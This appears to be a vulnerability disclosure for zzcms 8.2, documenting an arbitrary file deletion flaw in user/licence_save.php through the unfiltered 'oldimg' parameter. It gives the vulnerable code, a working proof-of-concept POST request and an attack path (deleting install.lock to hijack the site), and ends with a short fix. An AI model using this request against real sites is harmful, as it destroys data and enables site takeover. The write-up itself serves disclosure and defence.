---
title: licence_save.php
tags: 
 - bug
grammar_cjkRuby: true
---


# user/licence_save.php

## Edition :

zzcms 8.2

## Location 

`/user/licence_save.php`

![][1]

### Code:

```
if ($oldimg<>$img && $oldimg<>"/image/nopic.gif"){
			$f="../".$oldimg;
			if (file_exists($f)){
			unlink($f);
			}
			$fs="../".str_replace(".","_small.",$oldimg)."";
			if (file_exists($fs)){
			unlink($fs);		
			}
		}
```

### Rows : 31

### Harm

Allows attackers to delete files arbitrarily

### Cause the cause

Through the code can know that we only control oldimg, and it did not carry out the appropriate filtering

first create test.php

![][2]

Then perform the operation, remember to meet `$oldimg<>$img && $oldimg<>"/image/nopic.gif"`

![][3]

Then execute

![][4]

Then find test.php is gone

![][5]


## poc

```
GET:
http://127.0.0.1:8080/user/licence_save.php?action=modify
POST:
id=11&oldimg=test.php&img=1231
```

An attacker can use this vulnerability to delete any file, such as deleting install.lock for CMS reinstall and hijacking the website database.

## Solution

Can be filtered through the input of control parameters, strictly control the type of parameters, suffixes


  [1]: ./images/13.png "13"
  [2]: ./images/12.png "12"
  [3]: ./images/14.png "14"
  [4]: ./images/16.png "16"
  [5]: ./images/17.png "17"
  [6]: ./images/26.png "26"
  [7]: ./images/1_1.png "1"
  [8]: ./images/3.png "3"